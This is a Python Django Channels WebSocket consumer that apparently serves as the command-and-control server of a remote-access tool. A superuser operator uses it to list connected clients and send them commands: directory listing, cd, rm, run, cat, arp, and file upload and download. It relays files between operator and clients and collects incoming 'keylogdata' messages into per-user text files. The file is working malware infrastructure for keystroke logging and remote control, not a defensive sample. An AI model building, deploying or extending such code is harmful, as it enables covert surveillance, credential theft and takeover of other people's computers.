import os

from channels.db import database_sync_to_async
from channels.generic.websocket import AsyncWebsocketConsumer
import json
from channels.db import database_sync_to_async
from django.contrib.auth import get_user_model
from django.shortcuts import get_object_or_404

User = get_user_model()

#target_user = await database_sync_to_async(User.objects.get)(username="janek")
#arget_user_id = target_user.id
OnlineUsers = []
a = []
target = None

class ChatConsumer(AsyncWebsocketConsumer):
    global target
    @database_sync_to_async
    def get_user_id_by_username(self, username):
        try:
            print(f"szukam użytkownika: {username}")
            user = User.objects.get(username=str(username))
            print(f'userid: {user.id}')
            return user.id
        except User.DoesNotExist:
            print("Nie znaleziono użytkownika")
            return None
    async def disconnect(self, close_code):
        print(f'disconnect from {self.scope["user"].username}')
        print(f'code: {close_code}')
        for i in OnlineUsers:
            if i[0] == self.scope["user"].username:
                OnlineUsers.remove(i)
        print(OnlineUsers)
    async def connect(self):
        if self.scope["user"].is_anonymous:
            await self.close()
            return

        self.group_name = f"user_{self.scope['user'].id}"
        print(f'group name: {self.group_name}')
        print(f'channel_name: {self.channel_name}')
        if self.scope['user'].is_superuser:
            a.extend((self.scope['user'],self.scope['user'].id))
        else:
            OnlineUsers.extend(((self.scope['user'].username,self.scope["user"], self.scope["user"].id),))

        await self.channel_layer.group_add(
            self.group_name,
            self.channel_name
        )

        await self.accept()


    async def receive(self, text_data=None, bytes_data=None):
        global target
        #u = User.objects.get(username='user')
        #print(f'u: {u.id}')
        if text_data:
            json_data = json.loads(text_data)
            print(f'json_data: {json_data}')
            if self.scope["user"].is_superuser:
                print('superuser')
                if json_data.get('type') == 'command':
                    if json_data['command'] == 'list':
                        payload = ''
                        print(f'OnlineUsers: {OnlineUsers}')
                        for i,user in enumerate(OnlineUsers):
                            print(f'OnlineUsers[{i}]: {user}')
                            payload += f"<{i}:@{user[0]}>\n "
                        await self.send(text_data=json.dumps({'type':'message','payload':payload}))
                    elif json_data['command'] in ['dir',]:
                        #data = await self.get_user_id_by_username('user')
                        #print(f'data: {data}')
                        print('command is dir')

                        print(f'username 11: {json_data["target"]}')
                        data = json_data['target']
                        print(f'data: {data}')
                        data = str(data).strip()
                        user_id = await self.get_user_id_by_username(data)
                        print('userid is ', user_id)
                        if user_id:
                            await self.send_to_user(user_id, json_data['command'],type_m='command')
                        else:
                            print(f'User not found')
                            await self.send(text_data=json.dumps({'type':'message','payload':"User not found"}))
                    elif json_data['command'] in ['cd','rm','run','arp','cat'] :
                        print('cd')
                        print('rm')
                        print(json_data['command'])

                        data = json_data['target']
                        data = str(data).strip()
                        user_id = await self.get_user_id_by_username(data)
                        print('userid is ', user_id)
                        print(json_data)

                        if user_id:
                            await self.send_to_user(user_id, json_data,type_m='command')
                        else:
                            print(f'User not found')
                            await self.send(text_data=json.dumps({'type':'message','payload':"User not found"}))
                    elif json_data['command'] == 'download':
                        print('download')
                        data = json_data['target']
                        data = str(data).strip()
                        user_id = await self.get_user_id_by_username(data)
                        print('userid is ', user_id)
                        print('data is ', json_data)
                        if user_id:
                            await self.send_to_user(user_id, json_data,type_m='command')
                        else:
                            print(f'User not found')
                            await self.send(text_data=json.dumps({'type':'message','payload':"User not found"}))
                    elif json_data['command'] == 'other':
                        print('other')
                        data = json_data['target']
                        data = str(data).strip()
                        user_id = await self.get_user_id_by_username(data)
                        print('userid is ', user_id)
                        print('data is ', json_data)
                        if user_id:
                            await self.send_to_user(user_id, json_data,type_m='command')
                        else:
                            print(f'User not found')
                            await self.send(text_data=json.dumps({'type':'message','payload':"User not found"}))
                elif json_data.get('type') == 'upload':
                    print('upload')
                    if json_data.get('target') == 'serwer':
                        print('server')
                        data = json_data['user_target']
                        target = str(data).strip()
                    else:
                        data = json_data['target']
                        data = str(data).strip()
                        user_id = await self.get_user_id_by_username(data)
                        await self.send_to_user(user_id,json_data,type_m='command')


            else:
                if json_data['type'] == 'user_data':
                    await self.send_to_user('1',{'type':'user_data','payload':json_data['payload']})
                elif json_data['type'] == 'keylogdata':
                    print('keylogdata')
                    print(json_data)
                    if not os.path.exists(f'{self.scope["user"]}.txt'):
                        with open(f'{self.scope["user"]}.txt','w') as f:
                            print('creating file')
                            pass
                    with open(f'{self.scope["user"]}.txt','a') as f:
                        f.write(str(json_data['data']) + '\n')
                elif json_data['type'] == 'download':
                    if json_data.get('target') == 'serwer':
                        print('download')
                        print(f'data is {json_data}')
                        pass
                    else:
                        await self.send_to_user('1',{'type':'download','path':json_data['path'],'size':json_data['size']},type_m='download')
                else:
                    print(json_data)
        elif bytes_data:
            if self.scope['user'].is_superuser:

                print('superuser bytes')
                print(f'bytes data: {bytes_data}')
                data = str(target)
                user_id = await self.get_user_id_by_username(data)

                await self.send_bytes_to_user(user_id,bytes_data)
            else:
                print(f'bytes_data: {bytes_data}')
                await self.send_bytes_to_user('1',bytes_data)

        #await self.send(text_data=json.dumps(json_data))
    async def send_bytes_to_user(self,target_user_id,b:bytes):
        print('sending bytes to user')
        target_group = f"user_{target_user_id}"
        print(f'target_group: {target_group}')
        print(f"from: {self.scope['user'].id}, target: {target_user_id}")

        await self.channel_layer.group_send(
            f"user_{target_user_id}",
            {
                "type": "send_binary",
                "data": b
            }
        )

    async def send_binary(self, event):
        print('sending binary')
        await self.send(bytes_data=event["data"])


    async def send_to_user(self, target_user_id, message,type_m=''):
        target_group = f"user_{target_user_id}"
        print(f'target_group: {target_group}')
        print(f"from: {self.scope['user'].id}, target: {target_user_id}")
        await self.channel_layer.group_send(
            target_group,
            {
                "type": "notify",
                "message": {
                    'type':f'{type_m}',
                    "from": self.scope["user"].username,  # używamy scope["user"] zamiast self.user
                    "text": message
                }
            }
        )

    async def notify(self, event):
        # Odbiera event z group_send i wysyła do WebSocket
        await self.send(text_data=json.dumps(event["message"]))
